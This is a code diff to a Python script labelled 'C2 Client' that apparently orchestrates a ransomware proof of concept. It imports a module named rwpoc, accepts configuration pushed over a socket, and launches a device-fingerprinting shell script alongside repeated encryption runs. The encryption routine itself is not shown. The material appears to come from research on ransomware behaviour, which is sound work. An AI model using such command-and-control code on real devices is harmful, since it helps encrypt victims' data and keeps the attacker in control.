@@ -1,11 +1,21 @@
+from argparse import ArgumentParser
 from json import loads
 from multiprocessing import Process
-from os import path
 from socket import AF_INET, SOCK_STREAM, socket
-from subprocess import Popen
+from subprocess import call
 
 from globals import update_existing_config
 from rwpoc import run
+
+
+def parse_args():
+    parser = ArgumentParser(description='C2 Client')
+    parser.add_argument('-n', '--number',
+                        help='Number of fingerprints to collect in one encryption run.',
+                        default=0,
+                        action="store")
+
+    return parser.parse_args()
 
 
 def listen_for_config_changes():
@@ -25,18 +35,30 @@ def listen_for_config_changes():
                     update_existing_config(new_config)
 
 
+def collect_device_fingerprint(limit):
+    if limit > 0:
+        """
+        Remember: once the limit is reached the subprocess is terminated.
+        However, the (parent) encryption process is still running to completion
+        and will re-trigger the FP collection on the next iteration - up to the limit.
+        """
+        call(["./fingerprinter.sh", "-n {}".format(limit)])
+    else:
+        call("./fingerprinter.sh")  # without option "-n <limit>", this will continuously collect FP
+
+
 def kill_process(proc):
-    if isinstance(proc, Process):
-        print("kill Process", proc)
-        proc.terminate()
-        proc.join()
-    elif isinstance(proc, Popen):
-        print("kill Popen", proc)
-        proc.kill()
-        proc.wait()
+    print("kill Process", proc)
+    proc.terminate()
+    proc.join()
 
 
 if __name__ == "__main__":
+    # Parse arguments
+    args = parse_args()
+    num_fp = int(args.number)
+
+    # Start subprocess to integrate config changes
     procs = []
     proc_config = Process(target=listen_for_config_changes)
     procs.append(proc_config)
@@ -48,7 +70,8 @@ if __name__ == "__main__":
         while True:
             # input("\nEnter: start encrypting")
 
-            proc_fp = Popen(path.join(path.abspath(path.curdir), "fingerprinter.sh"))
+            proc_fp = Process(target=collect_device_fingerprint, args=(num_fp,))
+            proc_fp.start()
             procs.append(proc_fp)
 
             # input("\nwait shortly for child to start")
@@ -65,4 +88,7 @@ if __name__ == "__main__":
     finally:
         print("finally")
         for proc in procs:
-            kill_process(proc)
+            if proc.is_alive():
+                kill_process(proc)
+            else:
+                print("Process", proc, "already dead.")
